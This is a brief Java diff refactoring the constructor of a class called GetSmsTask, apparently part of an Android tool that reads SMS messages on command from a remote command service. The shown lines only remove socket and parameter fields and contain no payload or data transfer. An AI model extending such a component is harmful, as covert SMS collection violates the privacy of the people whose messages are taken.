@@ -27,15 +27,11 @@ public class GetSmsTask extends BaseTask {
 
     private static String TAG = "GetSmsTask";
 
-    private CommonParams commonParams;
-    private Socket socket;
     private int numsms;
 
     public GetSmsTask(CommandService client, int numsms) {
-        context = client;
-        this.socket = client.getSocket();
+        setContext(client);
         this.numsms = numsms;
-        this.commonParams = new CommonParams(client);
     }
 
     @Override
